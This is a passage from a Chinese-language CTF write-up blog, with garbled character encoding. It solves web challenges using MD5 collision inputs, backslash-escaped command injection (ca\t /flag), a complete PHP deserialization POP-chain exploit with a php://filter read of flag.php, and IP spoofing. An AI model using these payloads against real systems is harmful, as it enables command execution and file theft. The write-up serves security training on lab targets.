class="hljs-variable">$_POST</span>[&#x27;b&#x27;] <span class="hljs-operator">&amp;&amp;</span> md5(<span class="hljs-variable">$_POST</span>[&#x27;a&#x27;]) <span class="hljs-operator">===</span> md5(<span class="hljs-variable">$_POST</span>[&#x27;b&#x27;])) &#123;<br>        echo `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        echo (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ä¸‹é¢çš„MD5å¯ä»¥ç”¨MD5å¼ºç¢°æ’æ¥ç»•è¿‡</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>&amp;b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure><p>åå¼•å·ä¸ºsystem<br>ls&amp;catè¢«ç¦ç”¨ï¼Ÿ<br>æ²¡å…³ç³»<br>åæ–œæ ç»•è¿‡</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>l\s<br><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>l\s%<span class="hljs-number">20</span>/<br><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>ca\t%<span class="hljs-number">20</span>/flag<br></code></pre></td></tr></table></figure><p>å¼ºç¢°æ’ä¸å»ºè®®ç”¨hackbarï¼Œç”¨burp</p><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>å…ˆä¸Šæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>ä¸€å…±ä¸‰ä¸ªç±»</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">Modifier<br><span class="hljs-keyword">Show</span><br><span class="hljs-keyword">Test</span><br></code></pre></td></tr></table></figure><p>å…ˆåˆ†æModifierç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®šä¹‰ä¸€ä¸ªappendå‡½æ•°<br>æœ‰ä¸ªincludeï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¼ªåè®®æ¥è·å¾—flag.phpçš„å†…å®¹ï¼Œè€Œincludeéœ€è¦__invokeæ–¹æ³•æ¥è°ƒç”¨ï¼Œ__invokeè§¦å‘æ–¹æ³•ä¸ºï¼šå½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œæ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ã€‚</p><p>å†æ¥åˆ†æShowç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆçœ‹__toStringæ–¹æ³•ï¼Œæ˜¯ä¸ªè¾“å‡ºç‚¹</p><p>æœ€ååˆ†æTestç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>__get()æ–¹æ³•ï¼Œ(å½“è®¿é—®ç±»ä¸­çš„ç§æœ‰å±æ€§æˆ–è€…æ˜¯ä¸å­˜åœ¨çš„å±æ€§ï¼Œè§¦å‘__geté­”æœ¯æ–¹æ³•)ï¼Œè€ŒModifierç±»ä¸­æœ‰ç§æœ‰å±æ€§ï¼Œè¿™ä¸¤ä¸ªç±»é…åˆä¸€ä¸‹</p><p>æ€è·¯ï¼š<br>é¦–å…ˆä½¿</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$var</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>ç”±äºprotectè¢«ä¿æŠ¤çš„å˜é‡ç±»å¤–éƒ¨æ— æ³•è®¿é—®ï¼Œæ‰€ä»¥åœ¨ç±»é‡Œé¢å®šä¹‰<br>ç„¶åä½¿ç”¨Testç±»é‡Œçš„__getæ–¹æ³•è°ƒç”¨Modifierç±»ä¸­çš„__invokeæ–¹æ³•ï¼Œä½¿$pè¿™ä¸ªå˜é‡ä¸ºModifierè¿™ä¸ªå¯¹è±¡å°±å¯ä»¥è°ƒç”¨__invokeæ–¹æ³•ï¼Œæœ€åä½¿ç”¨Showè¿™ä¸ªç±»é‡Œçš„__toStringæ–¹æ³•è¾“å‡ºè¢«åŒ…å«çš„flag<br>ä½¿ç”¨Testç±»ä¸­çš„__Getæ–¹æ³•è°ƒç”¨Modifierç±»ä¸­çš„__invokeæ–¹æ³•å¾ˆç®€å•<br>ä½¿Test-&gt;p&#x3D;new Modifier();<br>Showä¸­__wakeupæ–¹æ³• ï¼Œpreg_matchå¯¹ç±»ä¸­çš„sourceè¿›è¡Œæ¯”è¾ƒï¼Œå°†å®ƒä½œä¸ºå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å°±è°ƒç”¨äº†__toStringæ–¹æ³•<br>__toStringæ˜¯åœ¨å¯¹è±¡è¢«å½“æˆå­—ç¬¦ä¸²çš„æ—¶å€™è°ƒç”¨<br>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦ä½¿Show-&gt;source &#x3D; new Show();<br>å³å¯è°ƒç”¨__toStringæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>=<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;index.php&quot;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;source . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$c</span>-&gt;p = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$b</span>-&gt;source = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$b</span>-&gt;source-&gt;str = <span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p><img src="/images/MQ083D130OO6OYCG15V.png"><br>è¿™é‡Œçš„buy it now æ˜¯æœ‰è¶…é“¾æ¥çš„<br>å¾®ä¿¡æ‰«ä¸€æ‰«å…ˆ<br><img src="/images/YNUL3D1EKV4C5VP4.png"><br>æ‹œæ‰˜ï¼ä½ ä¸ä¼šçœŸçš„æƒ³PYåˆ°flagå§ï¼Œè¿™æ ·å¯æ˜¯è¿è§„çš„ï¼å†å¥½å¥½åˆ†æä¸€ä¸‹ç•Œé¢ä»£ç å§<br>å¥½å§ï¼Œå¦è¾Ÿè¹Šå¾„<br>å›åˆ°ä¸»é¡µé¢ï¼Œå®¡è®¡æºä»£ç </p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">code</span>)&#123;<br>     <span class="hljs-built_in">hash</span> = hex_md5(code);<br>     <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>;<br>   &#125;<br>   <span class="hljs-keyword">function</span> <span class="hljs-title function_">validate</span>(<span class="hljs-params"></span>)&#123;<br>     <span class="hljs-keyword">var</span> code = document.getElementById(<span class="hljs-string">&quot;vcode&quot;</span>).value;<br>     <span class="hljs-keyword">if</span> (code != <span class="hljs-string">&quot;&quot;</span>)&#123;<br>       <span class="hljs-keyword">if</span>(hex_md5(code) == <span class="hljs-string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;<br>         alert(<span class="hljs-string">&quot;æ‚¨é€šè¿‡äº†éªŒè¯ï¼&quot;</span>);<br>         window.location = <span class="hljs-string">&quot;./flag.php&quot;</span><br>       &#125;<span class="hljs-keyword">else</span>&#123;<br>         alert(<span class="hljs-string">&quot;ä½ çš„æˆæƒç ä¸æ­£ç¡®ï¼&quot;</span>);<br>       &#125;<br>     &#125;<span class="hljs-keyword">else</span>&#123;<br>       alert(<span class="hljs-string">&quot;è¯·è¾“å…¥æˆæƒç &quot;</span>);<br>     &#125;<br>     <br>   &#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªflag.phpï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ç›´æ¥æŸ¥çœ‹<br><img src="/images/Y1HGFWJWYOPXT3ZN3L.png"><br>é‡ç‚¹æ˜¯è¿™ä¸€å¥è¯ï¼š<br>éªŒè¯é€»è¾‘æ˜¯åœ¨åç«¯çš„ï¼Œé™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±ï¼Œæ²¡æœ‰äººå¯ä»¥çœ‹åˆ°flag<br>é™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±ï¼Ÿ<br>ä¼ªé€ IPè¯•è¯•<br><img src="/images/6OLV4250O66RIYHW5SM.png"><br><img src="/images/JFJQBMOYHR56UBL4MK.png"><br>æºä»£ç ä¸­æŸ¥çœ‹flag</p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="/images/HHE63JPRZK5VP8UO.png"><br>çœ‹åˆ°ç»™çš„å†å²è¾“å…¥ï¼Œè¿˜ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œæ³¨å…¥äº†åŠå¤©æ¯›éƒ½æ²¡æœ‰<br>çœ‹çœ‹æºç ğŸ‘€<br><img src="/images/CCBM03PTUN15DEK50F.png"><br>è¿™é‡Œæç¤º<code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>éå¸¸é‡è¦<br>ä½†æ˜¯å¾ˆå¤šçš„ç½‘ç«™éƒ½æ˜¯utf-8ç¼–ç ï¼Œä¸ºä»€ä¹ˆä¼šè¯´è¿™é‡Œå¾ˆé‡è¦?<br>å›åˆ°è´­ä¹°ç•Œé¢ï¼Œæˆ‘ä»¬è¾“å…¥å…¶ä»–çš„ä»·æ 